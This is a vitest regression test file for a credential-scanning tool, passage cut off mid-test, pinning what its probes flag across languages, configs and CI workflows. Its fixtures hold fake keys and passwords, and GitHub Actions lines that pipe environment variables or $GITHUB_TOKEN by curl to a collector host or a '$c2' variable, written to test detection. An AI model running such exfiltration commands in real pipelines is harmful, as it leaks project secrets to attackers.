// src/test/secrets-precision-2026-09.test.js
//
// Regression pins for the 2026-09-03 keys-and-passwords precision pass.
//
// Every negative below was VERIFIED FIRING live against the full probe
// registry before the fix (30 of 36 claimed classes reproduced), via a
// crafted-corpus harness. Every negative is innocent code a reasonable
// developer ships. Each block also carries recall pins: the true-positive
// neighbor that must KEEP firing, so precision can never silently buy
// itself with recall.

import { describe, it, expect } from 'vitest';
import { PROBES } from '../lib/probes.js';
import {
  nameIsCredentialish,
  valueLooksLikeSecret,
  storageKeyIsAuthish,
  splitIdentifierSegments,
} from '../lib/probes/_internal/credential-shape.js';

const PROBE_BY_NAME = Object.fromEntries(PROBES.map((p) => [p.name, p.fn]));
const file = (path, content) => ({ path, content });
const run = (name, ...files) => PROBE_BY_NAME[name](files);
const titles = (findings) => findings.map((f) => `${f.severity}:${f.title}`).join(' | ');

describe('credential-shape primitives', () => {
  it('splits identifier segments across casings', () => {
    expect(splitIdentifierSegments('translationKey')).toEqual(['translation', 'key']);
    expect(splitIdentifierSegments('TOKEN_URL')).toEqual(['token', 'url']);
    expect(splitIdentifierSegments('TOKENIZER')).toEqual(['tokenizer']);
    expect(splitIdentifierSegments('monkey')).toEqual(['monkey']);
    expect(splitIdentifierSegments('APIKey')).toEqual(['api', 'key']);
  });
  it('reads credential names by segment, not substring', () => {
    expect(nameIsCredentialish('apiKey')).toBe(true);
    expect(nameIsCredentialish('API_KEY')).toBe(true);
    expect(nameIsCredentialish('SECRET_KEY')).toBe(true);
    expect(nameIsCredentialish('TOKENIZER')).toBe(false);
    expect(nameIsCredentialish('TOKEN_URL')).toBe(false);
    expect(nameIsCredentialish('password_field')).toBe(false);
    expect(nameIsCredentialish('keyboard_map')).toBe(false);
    expect(nameIsCredentialish('monkeyPatch')).toBe(false);
  });
  it('reads value shapes', () => {
    expect(valueLooksLikeSecret('9aZbYcXdWeVfUgThSiRj01')).toBe(true);
    expect(valueLooksLikeSecret('letmein')).toBe(true); // weak literal password stays a finding
    expect(valueLooksLikeSecret('user:profile:v2:default!')).toBe(false); // namespaced id
    expect(valueLooksLikeSecret('https://api.stripe.com/v1/charges')).toBe(false); // URL
    expect(valueLooksLikeSecret('auth.error.invalid.credentials')).toBe(false); // dotted id
    expect(valueLooksLikeSecret('home/dashboard/main/v2')).toBe(false); // route
    expect(valueLooksLikeSecret('password-input')).toBe(false); // kebab word chain
    expect(valueLooksLikeSecret('Enter your password')).toBe(false); // prose
    expect(valueLooksLikeSecret('Passwort')).toBe(false); // title-case UI word
  });
  it('reads storage keys by segment', () => {
    expect(storageKeyIsAuthish('authToken')).toBe(true);
    expect(storageKeyIsAuthish('sessionId')).toBe(true); // the id IS the credential
    expect(storageKeyIsAuthish('author')).toBe(false);
    expect(storageKeyIsAuthish('tokenCount')).toBe(false); // LLM usage counter
    expect(storageKeyIsAuthish('sessionTheme')).toBe(false);
  });
});

describe('Auth Weakness: confirm-password comparison', () => {
  it('does NOT flag password !== confirmPassword (signup form)', () => {
    const f = run(
      'Auth Weakness',
      file(
        'src/signup.js',
        `export function validate(password, confirmPassword) {\n  if (password !== confirmPassword) return 'Passwords do not match';\n  return null;\n}\n`
      )
    );
    expect(
      f.filter((x) => /comparison/i.test(x.title)),
      titles(f)
    ).toHaveLength(0);
  });
  it('still flags password === user.password (plaintext storage)', () => {
    const f = run(
      'Auth Weakness',
      file('src/login.js', `if (password === user.password) {\n  grantSession(user);\n}\n`)
    );
    expect(f.some((x) => /comparison/i.test(x.title))).toBe(true);
  });
  it('still flags oldPassword === user.password', () => {
    const f = run(
      'Auth Weakness',
      file('src/change.js', `if (oldPassword === user.password) {\n  allowChange();\n}\n`)
    );
    expect(f.some((x) => /comparison/i.test(x.title))).toBe(true);
  });
});

describe('Auth Weakness: object-literal and const credentials', () => {
  it('does NOT flag i18n message objects', () => {
    const f = run(
      'Auth Weakness',
      file('src/strings.js', `export const en = {\n  password: 'Enter your password',\n};\n`)
    );
    expect(f, titles(f)).toHaveLength(0);
  });
  it('does NOT flag validation rule chains', () => {
    const f = run(
      'Auth Weakness',
      file('src/rules.js', `export const rules = {\n  password: 'required|min:8|confirmed',\n};\n`)
    );
    expect(f, titles(f)).toHaveLength(0);
  });
  it('does NOT flag UI-metadata constants', () => {
    const f = run(
      'Auth Weakness',
      file(
        'src/constants.js',
        `export const LABEL_PASSWORD = 'Password';\nexport const INPUT_PASSWORD = 'password-input';\n`
      )
    );
    expect(f, titles(f)).toHaveLength(0);
  });
  it('still flags a real object-literal password', () => {
    const f = run(
      'Auth Weakness',
      file('src/mail.js', `const smtp = {\n  user: 'mailer',\n  password: 'hunter2Prod99',\n};\n`)
    );
    expect(f.some((x) => /object literal/i.test(x.title))).toBe(true);
  });
  it('still flags const PASSWORD with a real value', () => {
    const f = run('Auth Weakness', file('src/db.js', `const DB_PASSWORD = 'pr0d-N0t-a-drill';\n`));
    expect(f.some((x) => /password literal/i.test(x.title))).toBe(true);
  });
});

describe('Auth Weakness: config files and default credentials', () => {
  it('teaches compose stock defaults at low instead of critical', () => {
    const f = run(
      'Auth Weakness',
      file(
        'docker-compose.yaml',
        `services:\n  db:\n    image: postgres:16\n    environment:\n      POSTGRES_PASSWORD: postgres\n`
      )
    );
    const hit = f.find((x) => /compose/i.test(x.title));
    expect(hit).toBeDefined();
    expect(hit.severity).toBe('low');
  });
  it('keeps a real-looking compose password at critical', () => {
    const f = run(
      'Auth Weakness',
      file(
        'docker-compose.yaml',
        `services:\n  db:\n    environment:\n      POSTGRES_PASSWORD: xK9mQ2vLp8wN4r\n`
      )
    );
    const hit = f.find((x) => /config file/i.test(x.title));
    expect(hit).toBeDefined();
    expect(hit.severity).toBe('critical');
  });
  it('does NOT flag schema booleans, numbers, redactions, or manager refs', () => {
    const f = run(
      'Auth Weakness',
      file(
        'config/app.yaml',
        `password: true\nsecret: 300\nsmtp_password: "****"\ndb_password: op://vault/db/password\n`
      )
    );
    expect(f, titles(f)).toHaveLength(0);
  });
  it('does NOT flag role arrays as default credentials', () => {
    const f = run(
      'Auth Weakness',
      file(
        'src/roles.js',
        `export const roles = ['user', 'admin'];\nexport const fb = ['admin', 'guest'];\n`
      )
    );
    expect(
      f.filter((x) => /default credentials/i.test(x.title)),
      titles(f)
    ).toHaveLength(0);
  });
  it('still flags default credentials in a login call', () => {
    const f = run('Auth Weakness', file('src/seed.js', `await login('admin', 'admin');\n`));
    expect(f.some((x) => /default credentials/i.test(x.title))).toBe(true);
  });
  it('does NOT flag Basic-prose strings', () => {
    const f = run(
      'Auth Weakness',
      file('src/copy.js', `export const heading = 'Basic authentication';\n`)
    );
    expect(f, titles(f)).toHaveLength(0);
  });
});

describe('Secret Scanner: sk- discipline and comment blindness', () => {
  it('does NOT flag sk- CSS identifiers (no digits)', () => {
    const f = run(
      'Secret Scanner',
      file(
        'src/styles.js',
        `export const spinner = 'sk-flow-editor-container';\nexport const c = 'sk-chase-dot-before-animation';\n`
      )
    );
    expect(f, titles(f)).toHaveLength(0);
  });
  it('fires ONCE, as Anthropic, on an Anthropic-shaped key', () => {
    const key = 'sk-ant-api03-9aZbYcXdWeVfUgThSiRjQkPlOnMm0123456789AbCdEf';
    const f = run('Secret Scanner', file('src/claude.js', `const key = '${key}';\n`));
    expect(f).toHaveLength(1);
    expect(f[0].title).toContain('Anthropic');
  });
  it('does NOT read a # comment as a credential', () => {
    const f = run(
      'Secret Scanner',
      file(
        'scripts/setup.py',
        `# api_key = "abcd1234efgh5678ijkl9012mnop3456"\nprint("configure via env")\n`
      )
    );
    expect(f, titles(f)).toHaveLength(0);
  });
  it('downgrades a stock localhost database URL to low', () => {
    const f = run(
      'Secret Scanner',
      file('.env', `DATABASE_URL=postgres://postgres:postgres@localhost:5432/dev\n`)
    );
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe('low');
  });
  it('keeps a remote database URL with credentials at critical', () => {
    const f = run(
      'Secret Scanner',
      // Host must not contain 'example' — that is placeholder vocabulary
      // and SECRET_VALUE_PLACEHOLDER_RE rightly suppresses it.
      file('.env', `DATABASE_URL=postgres://app:xK9mQ2vLp8@db.prod.acmecorp.net:5432/app\n`)
    );
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe('critical');
  });
  it('does NOT flag env interpolation in a compose DB URL', () => {
    const f = run(
      'Secret Scanner',
      file(
        'docker-compose.yml',
        `services:\n  api:\n    environment:\n      DATABASE_URL: postgresql://app:\${DB_PASSWORD}@db:5432/app\n`
      )
    );
    expect(f, titles(f)).toHaveLength(0);
  });
});

describe('language adapters: identifier vocabulary is not a secret', () => {
  const NEGATIVES = [
    [
      'Go Hardcoded Secret',
      'internal/cache.go',
      `package cache\n\nfunc key() {\n\tcacheKey := "user:profile:v2:default!"\n\t_ = cacheKey\n}\n`,
    ],
    [
      'Go Hardcoded Secret',
      'internal/api.go',
      `package api\n\nfunc base() {\n\tauthAPI := "https://api.mycompany.io/v2/auth"\n\t_ = authAPI\n}\n`,
    ],
    [
      'Kotlin Hardcoded Secret',
      'app/src/Strings.kt',
      `val translationKey = "auth.error.invalid.credentials"\n`,
    ],
    [
      'Dart Hardcoded Secret',
      'lib/routes.dart',
      `const routeKeyHome = 'home/dashboard/main/v2';\n`,
    ],
    [
      'PHP Hardcoded Secret',
      'src/Client.php',
      `<?php\n$apiUrl = "https://api.stripe.com/v1/charges";\n`,
    ],
    [
      'Ruby Hardcoded Secret',
      'config/messages.rb',
      `MESSAGES = {\n  password_reset_message: "Check your email for the link",\n}\n`,
    ],
    [
      'Rust Hardcoded Secret',
      'src/cache.rs',
      `fn k() {\n    let cache_key = "user:profile:cache:v2:main!";\n    let _ = cache_key;\n}\n`,
    ],
    [
      'Swift Hardcoded Secret',
      'App/Anim.swift',
      `let bindingKeyframes = "transform.rotation.z.currentAnimation"\n`,
    ],
    [
      'Scala Hardcoded Secret',
      'src/Keys.scala',
      `object Keys {\n  val queryKeyUsers = "users:list:active:paginated:v2"\n}\n`,
    ],
    [
      'C Hardcoded Secret',
      'src/net.c',
      `#define API_BASE_URL "https://api.mycompany.io/v2/base"\nconst char *keyboard_map = "qwertyuiopasdfghjklzxcvbnm123";\n`,
    ],
  ];
  it.each(NEGATIVES)('%s does NOT flag %s', (probe, path, content) => {
    const f = run(probe, file(path, content));
    expect(f, titles(f)).toHaveLength(0);
  });

  const POSITIVES = [
    [
      'Go Hardcoded Secret',
      'internal/cfg.go',
      `package cfg\n\nfunc k() {\n\tapiKey := "9aZbYcXdWeVfUgThSiRjQkPlOnMm01"\n\t_ = apiKey\n}\n`,
    ],
    [
      'Kotlin Hardcoded Secret',
      'app/src/Cfg.kt',
      `val apiSecret = "9aZbYcXdWeVfUgThSiRjQkPlOnMm01"\n`,
    ],
    ['Ruby Hardcoded Secret', 'config/cfg.rb', `API_KEY = "9aZbYcXdWeVfUgThSiRjQkPlOnMm01"\n`],
    [
      'Rust Hardcoded Secret',
      'src/cfg.rs',
      `fn k() {\n    let api_key = "9aZbYcXdWeVfUgThSiRjQkPlOnMm01";\n    let _ = api_key;\n}\n`,
    ],
  ];
  it.each(POSITIVES)(
    '%s still flags a real credential assignment in %s',
    (probe, path, content) => {
      const f = run(probe, file(path, content));
      expect(f.length, titles(f)).toBeGreaterThan(0);
    }
  );
});

describe('Python Security: names, values, and adapter ownership', () => {
  it('does NOT flag ML and metadata names', () => {
    const f = run(
      'Python Security',
      file(
        'ml/model.py',
        `TOKENIZER = "bert-base-uncased"\nTOKEN_URL = "https://oauth2.googleapis.com/token"\npassword_field = "user_password_input"\n`
      )
    );
    expect(
      f.filter((x) => /credential/i.test(x.title)),
      titles(f)
    ).toHaveLength(0);
  });
  it('still flags the Django dev SECRET_KEY — that marker means not production-grade', () => {
    const f = run(
      'Python Security',
      file(
        'project/settings.py',
        `SECRET_KEY = "django-insecure-4f8a2b9c1d3e5f7a9b2c4d6e8f0a1b3c"\n`
      )
    );
    expect(f.some((x) => /credential/i.test(x.title))).toBe(true);
  });
  it('leaves api_key = "<20+ chars>" to the live adapter (no double fire)', () => {
    const content = `api_key = "abcdef1234567890abcdef1234567890"\n`;
    const py = run('Python Security', file('svc/client.py', content));
    const adapter = run('Python Hardcoded Secret', file('svc/client.py', content));
    expect(py.filter((x) => /credential/i.test(x.title))).toHaveLength(0);
    expect(adapter.length).toBeGreaterThan(0);
  });
});

describe('storage, randomness, CI, and public env', () => {
  it('does NOT flag benign storage keys', () => {
    const f = run(
      'Client Auth Storage',
      file(
        'src/prefs.js',
        `export function save(author) {\n  localStorage.setItem('author', author);\n  localStorage.setItem('tokenCount', '0');\n  localStorage.setItem('sessionTheme', 'dark');\n}\n`
      )
    );
    expect(f, titles(f)).toHaveLength(0);
  });
  it('still flags real auth storage keys', () => {
    const f = run(
      'Client Auth Storage',
      file(
        'src/auth.js',
        `localStorage.setItem('authToken', token);\nlocalStorage.setItem('sessionId', sid);\n`
      )
    );
    expect(f.length).toBeGreaterThanOrEqual(2);
  });
  it('does NOT flag UI variables that merely contain security substrings', () => {
    const f = run(
      'Weak Randomness',
      file(
        'src/ui.js',
        `export function jitter() {\n  const archived = Math.random() * 10;\n  const pinned = Math.random() > 0.5;\n  const keyframes = Math.random();\n  return { archived, pinned, keyframes };\n}\n`
      )
    );
    expect(f, titles(f)).toHaveLength(0);
  });
  it('still flags Math.random() for a reset token', () => {
    const f = run(
      'Weak Randomness',
      file('src/reset.js', `const resetToken = Math.random().toString(36).slice(2);\n`)
    );
    expect(f.length).toBeGreaterThan(0);
  });
  it('does NOT flag a GitHub release-asset upload as exfiltration', () => {
    const f = run(
      'GitHub Actions',
      file(
        '.github/workflows/release.yml',
        `name: release\non: push\njobs:\n  upload:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          curl -F file=@dist.zip -H "Authorization: token $GITHUB_TOKEN" -d '{}' https://uploads.github.com/repos/o/r/releases/1/assets\n`
      )
    );
    expect(
      f.filter((x) => /exfil|external host/i.test(x.title)),
      titles(f)
    ).toHaveLength(0);
  });
  it('still flags a secret POSTed to a non-GitHub host', () => {
    const f = run(
      'GitHub Actions',
      file(
        '.github/workflows/bad.yml',
        `name: bad\non: push\njobs:\n  leak:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -d "t=$GITHUB_TOKEN" https://collector.example.net/ingest\n`
      )
    );
    expect(f.some((x) => /secrets or credentials/i.test(x.title))).toBe(true);
  });
  it('does NOT flag publishable-by-design public env values', () => {
    const f = run(
      'NEXT_PUBLIC_ Misuse',
      file(
        '.env.production',
        `NEXT_PUBLIC_MAPBOX_TOKEN=pk.eyJ1IjoiZGVtby11c2VyIn0.abcdefghijklmnop\nNEXT_PUBLIC_TURNSTILE_SITE_KEY=0x4AAAAAAA\n`
      )
    );
    expect(f, titles(f)).toHaveLength(0);
  });
  it('still flags a real server secret behind NEXT_PUBLIC_', () => {
    const f = run(
      'NEXT_PUBLIC_ Misuse',
      file('.env.production', `NEXT_PUBLIC_STRIPE_SECRET_KEY=sk_live_9aZbYcXdWeVfUgThSiRj01\n`)
    );
    expect(f.length).toBeGreaterThan(0);
  });
});

// ————— Gate-1 pins (2026-09-03): 23 confirmed findings from the first
// adversarial round, each independently reproduced twice before the fix.
// Negatives are innocent code; positives are the recall the round proved
// the pass had cost, now restored. —————

describe('Gate-1: name vocabulary', () => {
  it('does NOT flag the header-name / env-name idiom', () => {
    const f = run(
      'Python Security',
      file(
        'src/api/client.py',
        `import os\n\nAPI_KEY_HEADER = "X-API-Key"\nAPI_KEY_ENV = "OPENAI_API_KEY"\n\ndef build():\n    return {API_KEY_HEADER: os.environ[API_KEY_ENV]}\n`
      )
    );
    expect(
      f.filter((x) => /credential/i.test(x.title)),
      titles(f)
    ).toHaveLength(0);
  });
  it('does NOT flag game vocabulary (hangman, guess-the-number, typing tutor)', () => {
    const py = run('Python Security', file('src/hangman.py', `secret_word = "elephant"\n`));
    expect(
      py.filter((x) => /credential/i.test(x.title)),
      titles(py)
    ).toHaveLength(0);
    const js = run(
      'Weak Randomness',
      file(
        'src/games.js',
        `const secretNumber = Math.floor(Math.random() * 100) + 1;\nconst keyName = KEYS[Math.floor(Math.random() * KEYS.length)];\nconst keySignature = SIGS[Math.floor(Math.random() * SIGS.length)];\nconst keyCode = Math.floor(Math.random() * 26) + 65;\n`
      )
    );
    expect(js, titles(js)).toHaveLength(0);
  });
  it('still flags a reset-token signing secret regardless of segment order', () => {
    const f = run(
      'Python Security',
      file(
        'app/settings.py',
        `PASSWORD_RESET_SECRET = "rst-9f8e7d6c5b4a-secret"\nRESET_PASSWORD_SECRET = "rst-9f8e7d6c5b4a-secret"\n`
      )
    );
    expect(f.filter((x) => /credential/i.test(x.title)).length, titles(f)).toBe(2);
  });
  it('still flags the uppercase API_KEY constant at critical', () => {
    const f = run(
      'Python Security',
      file('app/settings.py', `API_KEY = "a1b2c3d4e5f6g7h8i9j0k1"\n`)
    );
    expect(
      f.some((x) => /credential/i.test(x.title)),
      titles(f)
    ).toBe(true);
  });
});

describe('Gate-1: value shapes', () => {
  it('does NOT flag preference/cache keys with version or camelCase values', () => {
    const cases = [
      [
        'Kotlin Hardcoded Secret',
        'app/Prefs.kt',
        `private const val PREF_KEY_ONBOARDING = "onboarding_tutorial_v2"\n`,
      ],
      [
        'Go Hardcoded Secret',
        'internal/cache.go',
        `package c\n\nfunc k() {\n\tcacheKey := "weather-forecast-v2-hourly"\n\t_ = cacheKey\n}\n`,
      ],
      [
        'Swift Hardcoded Secret',
        'App/Settings.swift',
        `static let onboardingKey = "hasCompletedOnboardingV2"\n`,
      ],
      ['Ruby Hardcoded Secret', 'app/dash.rb', `CACHE_KEY = "dashboard_stats_v2_cache"\n`],
    ];
    for (const [probe, path, content] of cases) {
      const f = run(probe, file(path, content));
      expect(f, `${probe}: ${titles(f)}`).toHaveLength(0);
    }
  });
  it('does NOT flag single validation keywords or non-ASCII UI copy', () => {
    const f = run(
      'Auth Weakness',
      file(
        'src/forms.js',
        `export const schema = { password: 'required' };\nconst labels = { username: 'Usuario', password: 'Contrase\u00f1a' };\n`
      )
    );
    expect(f, titles(f)).toHaveLength(0);
  });
  it('still flags diceware passphrases under password-family names', () => {
    const js = run(
      'Auth Weakness',
      file('src/mailer.js', `const smtp = { user: 'mailer', password: 'blue-ocean-tiger-moon' };\n`)
    );
    expect(
      js.some((x) => /object literal/i.test(x.title)),
      titles(js)
    ).toBe(true);
    const py = run(
      'Python Security',
      file('app/settings.py', `DB_PASSWORD = "correct-horse-battery-staple"\n`)
    );
    expect(
      py.some((x) => /credential/i.test(x.title)),
      titles(py)
    ).toBe(true);
  });
  it('still flags password: 123456 in config', () => {
    const f = run(
      'Auth Weakness',
      file('config/database.yml', `production:\n  password: 123456\n`)
    );
    expect(
      f.some((x) => /config file/i.test(x.title)),
      titles(f)
    ).toBe(true);
  });
  it('does NOT flag Spring/Maven @property@ references', () => {
    const f = run(
      'Auth Weakness',
      file(
        'src/main/resources/application.properties',
        `spring.datasource.password=@db.password@\n`
      )
    );
    expect(f, titles(f)).toHaveLength(0);
  });
});

describe('Gate-1: cross-language parity and cookies', () => {
  it('does NOT flag Python confirm-password comparisons', () => {
    const f = run(
      'Python Security',
      file(
        'accounts/forms.py',
        `def clean(password1, password2, password, confirm_password):\n    if password1 == password2:\n        pass\n    if password == confirm_password:\n        pass\n`
      )
    );
    expect(
      f.filter((x) => /comparison/i.test(x.title)),
      titles(f)
    ).toHaveLength(0);
  });
  it('does NOT flag JS password !== password2 / passwordConfirmation', () => {
    const f = run(
      'Auth Weakness',
      file(
        'src/signup.js',
        `if (password !== password2) fail();\nif (password !== passwordConfirmation) fail();\nif (password !== passwordAgain) fail();\n`
      )
    );
    expect(
      f.filter((x) => /comparison/i.test(x.title)),
      titles(f)
    ).toHaveLength(0);
  });
  it('does NOT flag preference cookies', () => {
    const f = run(
      'Client Auth Storage',
      file(
        'src/prefs.js',
        `Cookies.set('author', name, { expires: 30 });\ndocument.cookie = 'sessionTheme=' + theme + '; path=/';\n`
      )
    );
    expect(f, titles(f)).toHaveLength(0);
  });
  it('still flags auth cookies set from client JS', () => {
    const f = run(
      'Client Auth Storage',
      file('src/auth.js', `document.cookie = 'authToken=' + token + '; path=/';\n`)
    );
    expect(
      f.some((x) => /cookie/i.test(x.title)),
      titles(f)
    ).toBe(true);
  });
  it('still flags authState persisted to localStorage', () => {
    const f = run(
      'Client Auth Storage',
      file('src/auth.js', `localStorage.setItem('authState', JSON.stringify({ token }));\n`)
    );
    expect(f.length, titles(f)).toBeGreaterThan(0);
  });
});

describe('Gate-1: maps, labels, and public-by-design', () => {
  it('does NOT flag role-label and stage-name maps', () => {
    const f = run(
      'Auth Weakness',
      file(
        'src/constants.js',
        `export const ROLE_LABELS = { 'admin': 'Admin', 'user': 'User' };\nexport const ENV_NAMES = { 'dev': 'development', 'test': 'test' };\nconst authRoles = ['user', 'admin'];\n`
      )
    );
    expect(
      f.filter((x) => /default credentials/i.test(x.title)),
      titles(f)
    ).toHaveLength(0);
  });
  it('teaches the Firebase client key at low instead of critical', () => {
    const dart = run(
      'Dart Hardcoded Secret',
      file(
        'lib/firebase_options.dart',
        `// File generated by FlutterFire CLI.\nconst apiKey = 'AIzaSyC3xR9tYw2LpQ8vN4mK6jH1sD5fG7aB0eZ';\n`
      )
    );
    expect(dart, titles(dart)).toHaveLength(0);
    const scanner = run(
      'Secret Scanner',
      file(
        'src/lib/firebase.js',
        `const firebaseConfig = { apiKey: 'AIzaSyC3xR9tYw2LpQ8vN4mK6jH1sD5fG7aB0eZ', authDomain: 'recipe-box.firebaseapp.com' };\n`
      )
    );
    expect(scanner.length, titles(scanner)).toBeGreaterThan(0);
    expect(
      scanner.every((x) => x.severity === 'low'),
      titles(scanner)
    ).toBe(true);
  });
  it('still flags WEBSITE_KEY / WEBSITE_TOKEN behind a public prefix', () => {
    const f = run(
      'NEXT_PUBLIC_ Misuse',
      file('.env', `NEXT_PUBLIC_WEBSITE_TOKEN=internal-service-token-9f3k2\n`)
    );
    expect(f.length, titles(f)).toBeGreaterThan(0);
  });
});

describe('Gate-1: recall restored', () => {
  it('still flags a $-containing DB password on a remote host', () => {
    const f = run(
      'Secret Scanner',
      file(
        '.env',
        `DATABASE_URL=postgresql://appuser:Sup3r$ecretPass@db1.acmecorp.net:5432/appdb\n`
      )
    );
    expect(f.length, titles(f)).toBe(1);
    expect(f[0].severity).toBe('critical');
  });
  it('does NOT flag a commented-out secret in .env or Dockerfile', () => {
    const env = run(
      'Secret Scanner',
      file('.env', `# STRIPE_SECRET_KEY=sk_live_4eC39HqLyjWDarjtT1zd\nPORT=3000\n`)
    );
    expect(env, titles(env)).toHaveLength(0);
    const docker = run(
      'Secret Scanner',
      file('Dockerfile', `FROM node:20\n# ENV STRIPE_SECRET_KEY=sk_live_4eC39HqLyjWDarjtT1zd\n`)
    );
    expect(docker, titles(docker)).toHaveLength(0);
  });
  it('still catches exfil hidden behind a decoy GitHub URL', () => {
    const f = run(
      'GitHub Actions',
      file(
        '.github/workflows/x.yml',
        `name: x\non: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: env | curl -sf -X POST --data-binary @- "$COLLECT_URL" ; curl -s https://api.github.com/rate_limit\n`
      )
    );
    expect(
      f.some((x) => /secrets or credentials/i.test(x.title)),
      titles(f)
    ).toBe(true);
  });
});

// ————— Gate-2 pins (2026-09-03): 15 confirmed recall findings from the
// second adversarial round. The theme: strong credential NAMES assert the
// value, identifier-shape rejections only disambiguate weak 'key' names. —————

describe('Gate-2: strong names beat value-shape rejections', () => {
  it('still flags word-chain signing secrets under strong names', () => {
    const py = run(
      'Python Security',
      file('project/settings.py', `SECRET_KEY = "this-is-my-secret-key"\n`)
    );
    expect(
      py.some((x) => /credential/i.test(x.title)),
      titles(py)
    ).toBe(true);
    const js = run(
      'Auth Weakness',
      file(
        'src/auth.js',
        `const JWT_SECRET = 'my-super-secret-key';\nconst cfg = { secret: 'super-secret-signing-key' };\n`
      )
    );
    expect(
      js.filter((x) => /password literal|object literal/i.test(x.title)).length,
      titles(js)
    ).toBe(2);
  });
  it('one hyphen no longer flips critical to silent', () => {
    const f = run('Auth Weakness', file('src/a.js', `const JWT_SECRET = 'super-secret';\n`));
    expect(
      f.some((x) => /password literal/i.test(x.title)),
      titles(f)
    ).toBe(true);
  });
  it('still flags colon-format tokens (Telegram, Astra)', () => {
    const py = run(
      'Python Security',
      file('bot.py', `BOT_TOKEN = "7912345678:AAHk9vXz2mQ4pR7sT1uB5cD8eF3gH6iJkLm"\n`)
    );
    expect(
      py.some((x) => /credential/i.test(x.title)),
      titles(py)
    ).toBe(true);
    const astra = run(
      'Python Security',
      file('db.py', `astra_token = "AstraCS:AbCdEfGhIjKlMnOp:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d"\n`)
    );
    expect(
      astra.some((x) => /credential/i.test(x.title)),
      titles(astra)
    ).toBe(true);
    const go = run(
      'Go Hardcoded Secret',
      file(
        'cmd/main.go',
        `package main\n\nfunc b() {\n\tbotToken := "7912345678:AAHk9vXz2mQ4pR7sT1uB5cD8eF3gH6iJkLm"\n\t_ = botToken\n}\n`
      )
    );
    expect(go.length, titles(go)).toBeGreaterThan(0);
  });
  it('weak bare-key names still get the identifier-shape rejections', () => {
    const go = run(
      'Go Hardcoded Secret',
      file(
        'internal/c.go',
        `package c\n\nfunc k() {\n\tcacheKey := "user:profile:v2:default!"\n\t_ = cacheKey\n}\n`
      )
    );
    expect(go, titles(go)).toHaveLength(0);
  });
  it('still flags a Google app password pasted with display spaces', () => {
    const f = run('Python Security', file('notify.py', `SMTP_PASSWORD = "kdym vxwq zbtr fslg"\n`));
    expect(
      f.some((x) => /credential/i.test(x.title)),
      titles(f)
    ).toBe(true);
  });
  it('still flags numeric qualified secrets in config', () => {
    const f = run(
      'Auth Weakness',
      file('config/app.yaml', `auth:\n  jwt_secret: 123456\n  session_secret: 987654321\n`)
    );
    expect(f.filter((x) => /config file/i.test(x.title)).length, titles(f)).toBe(2);
    const ttl = run('Auth Weakness', file('config/cache.yaml', `secret: 300\n`));
    expect(ttl, titles(ttl)).toHaveLength(0);
  });
});

describe('Gate-2: manifest coverage', () => {
  const POSITIVES = [
    [
      'Supabase sb_secret_',
      '.env',
      `SUPABASE_SECRET_KEY=sb_secret_9fK2mQ7wZp4vN8rT3uB6yD1cE5gH0jLsm4kQ9s\n`,
      'critical',
    ],
    [
      'Supabase service_role JWT',
      'server/admin.ts',
      `const k = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJvbGUiOiJzZXJ2aWNlX3JvbGUiLCJpYXQiOjE2NDU1fQ.Vb9tXk2mQ7wZp4rN8cJ5uD1yF6hL3gS0aE9iK7oM2sU';\n`,
      'critical',
    ],
    ['xAI key in .env', '.env', `XAI_API_KEY=xai-Vq3jW8kZ2mN5pR7sT9uB4cD6eF1gH0iJ\n`, 'critical'],
    [
      'Stripe restricted live key',
      'server/billing.js',
      `const stripe = require('stripe')('rk_live_51H8mK2eZvKYlo2C9qPw');\n`,
      'critical',
    ],
    [
      'Discord webhook URL',
      'src/alerts.js',
      `const WEBHOOK_URL = 'https://discord.com/api/webhooks/1289456123456789012/aB3cD9eF1gH5iJ7kL2mN8oP4qR6sT0uV_wX-yZ5aB1cD7eF3gH9iJ5kL1mN7oP3qR9s';\n`,
      'high',
    ],
    [
      'Upstash Redis URL',
      '.env',
      `REDIS_URL=rediss://default:Ax9kQ2mPz8vN4rT6uW1yB5cE7fH3jK0m@usw1-brave-cat-12345.upstash.io:6379\n`,
      'critical',
    ],
  ];
  it.each(POSITIVES)('%s fires at the right severity', (_desc, path, content, sev) => {
    const f = run('Secret Scanner', file(path, content)).filter(
      (x) => !/\.env file present/i.test(x.title)
    );
    expect(f.length, titles(f)).toBeGreaterThan(0);
    expect(
      f.some((x) => x.severity === sev),
      titles(f)
    ).toBe(true);
  });
  it('still teaches the localhost redis default at low', () => {
    const f = run(
      'Secret Scanner',
      file('.env', `REDIS_URL=redis://default:default@localhost:6379\n`)
    );
    expect(f.length, titles(f)).toBe(1);
    expect(f[0].severity).toBe('low');
  });
});

describe('Gate-2: template literals, CI, and Firebase scoping', () => {
  it('flags a pasted key inside a plain backtick template', () => {
    const f = run(
      'Secret Scanner',
      file(
        'src/lib/openai.js',
        'const h = { Authorization: `Bearer sk-proj-Ab3dEf6hIj9kLm2nOp5qRs8tUv1wXy4zAb7cDe0fGh3iJk6lMn9o` };\n'
      )
    );
    expect(f.length, titles(f)).toBeGreaterThan(0);
  });
  it('still suppresses a key shape inside an interpolating template', () => {
    const f = run(
      'Secret Scanner',
      file(
        'src/docs.js',
        'const example = `const OPENAI_API_KEY = "sk-proj-Ab3dEf6hIj9kLm2nOp5qRs8tUv1wXy4z"; // then use ${clientName}`;\n'
      )
    );
    expect(f, titles(f)).toHaveLength(0);
  });
  it('catches exfil to a lowercase-variable destination behind a decoy URL', () => {
    const f = run(
      'GitHub Actions',
      file(
        '.github/workflows/x.yml',
        `name: x\non: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -d "t=$GITHUB_TOKEN" "$c2" && curl https://api.github.com/rate_limit\n`
      )
    );
    expect(
      f.some((x) => /secrets or credentials/i.test(x.title)),
      titles(f)
    ).toBe(true);
  });
  it('catches secret data POSTed to api.github.com (the worm channel)', () => {
    // Two visible-secret variants of the Shai-Hulud shape: command
    // substitution in the data position, and a pipe into curl's stdin-data.
    // The file-reference variant (--data @/tmp/x.json with the token only in
    // the auth header) is a documented single-line limit — statically
    // indistinguishable from release automation (Gate-3 adjudication).
    const f = run(
      'GitHub Actions',
      file(
        '.github/workflows/y.yml',
